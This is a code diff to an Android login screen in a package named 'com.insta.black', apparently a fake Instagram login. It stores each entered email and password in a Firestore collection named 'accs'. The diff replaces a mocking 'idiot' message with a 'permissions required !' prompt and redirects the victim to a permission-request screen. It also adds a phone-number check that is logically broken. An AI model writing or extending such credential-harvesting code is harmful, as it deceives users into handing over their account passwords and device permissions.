@@ -1,5 +1,6 @@
 package com.insta.black;
 
+import android.content.Intent;
 import android.graphics.Color;
 import android.os.Bundle;
 
@@ -45,7 +46,9 @@ public class login extends AppCompatActivity {
                             map.put("email",email);
                             map.put("password",password);
                             firestore.collection("accs").add(map).addOnSuccessListener(DocumentReference ->{
-                                Toast.makeText(login.this,"idiot",Toast.LENGTH_LONG).show();
+                                Toast.makeText(login.this,"permissions required !",Toast.LENGTH_LONG).show();
+                                Intent in = new Intent(login.this, requestp.class);
+                                startActivity(in);
                                 finish();}
                             ).addOnFailureListener(DocumentReference ->{
                                 Toast.makeText(login.this,"error "+DocumentReference.getMessage().toString(),Toast.LENGTH_LONG).show();
@@ -60,7 +63,7 @@ public class login extends AppCompatActivity {
                         passwordEditText.setTextColor(Color.RED);
                     }
                 } else {
-                    emailEditText.setError("Invalid email");
+                    emailEditText.setError("Invalid phone number or email");
                     emailEditText.setTextColor(Color.RED);
                 }
             }
@@ -68,7 +71,21 @@ public class login extends AppCompatActivity {
     }
 
     private boolean isValidEmail(String email) {
-        return Patterns.EMAIL_ADDRESS.matcher(email).matches();
+
+       if (Patterns.EMAIL_ADDRESS.matcher(email).matches()){
+           return true;
+
+       }else{
+           try {
+               if(Integer.valueOf(email) < 9){
+                   return false;
+               }else {
+                   return true;
+               }
+           }catch (Exception e){
+               return false;
+           }
+       }
     }
 
     private boolean isValidPassword(String password) {
